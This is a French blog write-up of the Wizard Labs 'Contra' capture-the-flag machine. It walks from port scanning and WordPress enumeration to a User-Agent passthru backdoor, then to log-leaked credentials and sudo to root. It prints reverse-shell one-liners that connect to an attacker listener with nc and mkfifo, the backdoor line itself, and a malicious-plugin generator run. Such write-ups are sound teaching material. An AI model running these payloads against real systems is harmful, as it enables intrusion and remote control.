# Solution du CTF Contra de Wizard Labs

Insert Coin
-----------

*Contra* est un CTF proposé sur [Wizard-Labs](https://labs.wizard-security.net/), nommé après [un vieux jeu vidéo](https://en.wikipedia.org/wiki/Contra_(video_game)).  

Il s'agit ici d'une machine Linux. La difficulté annoncée est de 5/10. A l'aise non ?  

Haut, Haut, Bas, Bas, Gauche, Droite, Gauche, Droite, B, A
----------------------------------------------------------

Cette machine dispose de trois ports TCP ouverts dont un serveur FTP permettant la connexion anonyme :  

```plain
21/tcp open  ftp     vsftpd 3.0.3
|_banner: 220 (vsFTPd 3.0.3)
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

Malheureusement on ne trouve aucun fichier et les droits d'accès ne permettent pas d'y déposer quoique ce soit.  

Le serveur web affiche une page défacée avec un ascii art à rendre jaloux le graphiste de *The Offspring* :  

![Contra Wizard Labs CTF defaced index page](https://raw.githubusercontent.com/devl00p/blog/master/images/wizard-labs/contra_skull.png)

Un dirbuster permet de découvrir rapidement un Wordpress à l'adresse */blog*. Ce dernier a visiblement été piraté :  

![Contra Wizard Labs CTF hacked wordpress](https://raw.githubusercontent.com/devl00p/blog/master/images/wizard-labs/contra_hacked_wordpress.png)

Ma première réaction a été de lancé un WPscan sur ce *Wordpress 4.9.8*, ce qui ne m'a pas mené bien loin...  

On trouve toutefois que l'utilisateur *admin* a le mot de passe *admin*, ce qui laisse supposer une trajectoire toute définie d'exploitation qui consiste à éditer les fichiers PHP d'un thème présent pour y placer une backdoor PHP.  

Seulement voilà, on manque de permissions pour éditer le moindre fichier car l'indique le message en fin de page de l'éditeur :  

> You need to make this file writable before you can save your changes. See the Codex for more information.

Une solution de rechange est d'uploader un plugin Wordpress contenant une backdoor. Il y a un outil nommé [WordPwn](https://github.com/wetw0rk/malicious-wordpress-plugin) qui peut se charger de ça :  

```plain
$ python wordpwn.py 10.254.0.29 7777 N
[*] Checking if msfvenom installed
[+] msfvenom installed
[+] Generating plugin script
[+] Writing plugin script to file
[+] Generating payload To file
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of php/base64
php/base64 succeeded with size 1506 (iteration=0)
php/base64 chosen with final size 1506
Payload size: 1506 bytes

[+] Writing files to zip
[+] Cleaning up files
[+] General Execution Location: http://(target)/wp-content/plugins/malicous/
[+] General Upload Location: http://(target)/wp-admin/plugin-install.php?tab=upload
```

Mais pas plus de chances, cette fois c'est le dossier */wp/content/uploads* qui semble en lecture seule...  

Il y a bien [cette vulnérabilité qui pourrait toucher le Wordpress](https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/) mais son exploitation semble assez capilotractée, d'ailleurs il n'existe pas d'exploit correspondant.  

Pour une difficulté de 5/10 ça semble assez improbable que ce soit le chemin attendu...  

Size does matter
----------------

Avec un coup de pouce de *tejmal* (un autre participant) je me suis tourné vers une wordlist plus grosse pour l'énumération.  

En l’occurrence j'ai utilise le fichier suivant que l'on peut trouver sur Kali Linux :  

```plain
/usr/share/golismero/wordlist/fuzzdb/Discovery/PredictableRes/raft-large-files.txt
```

On découvre alors un fichier *notes.txt* dans la racine web avec le contenu suivant :  

```plain
/!\ Urgent :Our infrastructure got hacked by some hackers . Everyone must change credentials and please dont download zipped files because  they may be backdoored !
```

On enchaîne avec une énumération sur les fichiers zip et sans surprise on trouve un *wordpress.zip*. La décompression ne révèle pas de fichiers anormaux par rapport à une installation Wordpress standard.  

J'ai donc utilisé l'un des outils les plus avancés au monde, à savoir grep :p  

```plain
$ grep -r --include "*.php" passthru blog/
blog/wp-login.php:passthru($_SERVER['HTTP_USER_AGENT']);  // BOOM backdoor from the Heaven ^^
```

On voit ici qu'une backdoor tente d'exécuter ce qui est reçu comme User-Agent dans les entêtes HTTP.  

La machine a été un peu récalcitrante à me donner un shell, Wget passait mais l'exécution de la backdoor non, bizarre mais peu importe j'ai utilisé un reverse shell liste [chez Pentest Monkey](https://web.archive.org/web/20190215143410/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).  

```bash
curl -A "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.254.0.29 9999 >/tmp/f" http://10.1.1.38/blog/wp-login.php
```

En réalité la version de *netcat* présente ne dispose pas de l'option -e mais c'était possible de régler le problème avec le binaire *nc.traditional* lui aussi présent :  

```bash
curl -A "nc.traditional -e /bin/bash 10.254.0.29 9999" http://10.1.1.38/blog/wp-login.php
```

On obtient un shell en tant que *www-data* :  

```plain
$ ncat -l -p 9999 -v
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.1.1.38.
Ncat: Connection from 10.1.1.38:33406.
/bin/sh: 0: can't access tty; job control turned off
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@contra:/var/www/html/blog$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

S'ensuit une énumération classique. Je commence toujours par regarder les utilisateurs présents sur le système et leurs groupes.  

Dans notre cas un utilisateur *bill* fait partie du groupe *sudo*. On peut lire le flag dans son dossier personnel (*7a50dcf6959e01f42097b051e88c9554*). L'utilisateur ne dispose pas de fichiers à lui en dehors de son */home/bill* et il n'y a pas de mention particulères sous */etc*.  

Level up
--------

Puisque l'on est débarqué dans le dossier de Wordpress autant fouiller un peu.  

```php
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'username');

/** MySQL database password */
define('DB_PASSWORD', 'password');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

Les identifiants MySQL pour le Wordpress laissent supposer en accès restreint mais en fait on peut fouiller dans d'autres bases de données :  

```plain
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| contra             |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+
6 rows in set (0.00 sec)
```

La base contra nous semblait toute destinée mais les tables étaient vides :  

```plain
mysql> use contra;
Database changed
mysql> show tables;
show tables;
+------------------+
| Tables_in_contra |
+------------------+
| credentials      |
| creds            |
+------------------+
2 rows in set (0.00 sec)
```

Quand aux utilisateurs mysql c'est tout comme (donc pas de password reuse en perspective):  

```plain
mysql> select User, authentication_string from user;
select User, authentication_string from user;
+------------------+-------------------------------------------+
| User             | authentication_string                     |
+------------------+-------------------------------------------+
| root             |                                           |
| mysql.session    | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
| mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
| debian-sys-maint | *F1F2CA42948B3A91A115008DFCD881598A28445A |
| username         | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 |
+------------------+-------------------------------------------+
5 rows in set (0.00 sec)
```

J'ai exécuté LinEnum histoire de détecter des anomalies et quelque chose de particulier m'a mené dans la bonne direction :  

```plain
[-] World-writable files (excluding /proc and /sys):
-rwxrwxrwx 1 www-data www-data 174003 Dec 26  2017 /var/www/html/contra.jpg
-rwxrwxrwx 1 root adm 233 Dec  9 06:25 /var/log/apache2/error.log.14.gz
-rwxrwxrwx 1 root adm 235 Dec 16 06:25 /var/log/apache2/error.log.7.gz
-rwxrwxrwx 1 root adm 526 Dec 10 06:25 /var/log/apache2/error.log.13.gz
-rwxrwxrwx 1 root adm 0 Aug 12  2018 /var/log/apache2/other_vhosts_access.log
-rwxrwxrwx 1 root adm 655966 Dec 16 18:00 /var/log/apache2/access.log.1
-rwxrwxrwx 1 root adm 238 Dec 12 06:25 /var/log/apache2/error.log.11.gz
-rwxrwxrwx 1 root adm 237 Dec 15 06:25 /var/log/apache2/error.log.8.gz
-rwxrwxrwx 1 root adm 13220 Aug 13  2018 /var/log/apache2/access.log.3.gz
-rwxrwxrwx 1 root adm 2668 Dec  9 16:35 /var/log/apache2/access.log.2.gz
-rwxrwxrwx 1 root adm 1609 Dec 17 06:25 /var/log/apache2/error.log.6.gz
-rwxrwxrwx 1 root adm 236 Dec 14 06:25 /var/log/apache2/error.log.9.gz
-rwxrwxrwx 1 root adm 237 Dec 11 06:25 /var/log/apache2/error.log.12.gz
-rwxrwxrwx 1 root adm 238 Dec 13 06:25 /var/log/apache2/error.log.10.gz
```

Les fichiers de logs d'Apache ne sont normalement pas écrivables, souvent même pas consultables pour des non-administrateurs.  

Je suis reparti dans la racine web :  

```plain
www-data@contra:/var/www/html$ ls -l
total 260
drwxr-xr-x 2 root     root       4096 Dec 16 15:22 RecoveryUtility
dr-x---r-x 5 www-data www-data   4096 Dec 22 17:29 blog
-rwxrwxrwx 1 www-data www-data 174003 Dec 26  2017 contra.jpg
-rw-r--r-- 1 root     root      14957 Dec 16 15:40 index.html
-rw-r--r-- 1 root     root        167 Dec 16 12:32 notes.txt
-rw-r--r-- 1 root     root      51792 Dec 16 15:27 wordpress.zip
www-data@contra:/var/www/html$ cd RecoveryUtility
www-data@contra:/var/www/html/RecoveryUtility$ ls
newpass.php
www-data@contra:/var/www/html/RecoveryUtility$ cat newpass.php
```

```php
<?php
error_reporting(-1); // reports all errors
ini_set("display_errors", "1");

// admin can you make logs unreadable for more security  ?
$newpass = $_GET["newpassword"];

$command = sprintf("UPDATE credentials SET password='%s' ",$newpass);
$conn = new mysqli("localhost", "username", "password","contra");
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
if ($conn->query($command) === TRUE) {
    echo "Record updated successfully";
} else {
    echo "Error updating record: " . $conn->error;
}

$conn->close();
?>
```

C'est encore *grep* qui nous sort de l'embarras :  

```plain
/var/log/apache2/access.log.1:::1 - - [16/Dec/2018:13:55:42 +0000] "GET /RecoveryUtility/newpass.php?newpassword=Sup3rp@ssw0rd99 HTTP/1.1" 200 463 "-" "curl/7.58.0"
```

Game Over
---------

On peut alors se connecter avec le compte bill en SSH. La suite c'est du déjà vu :  

```plain
bill@contra:~$ sudo -l
[sudo] password for bill:
Matching Defaults entries for bill on contra:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bill may run the following commands on contra:
    (ALL : ALL) ALL
bill@contra:~$ sudo su
root@contra:/home/bill# id
uid=0(root) gid=0(root) groups=0(root)
root@contra:/home/bill# cd
root@contra:~# ls
root.txt
root@contra:~# cat root.txt
8122079ae9ee220d2a655c739101c4f4
```


*Published November 17 2020 at 13:59*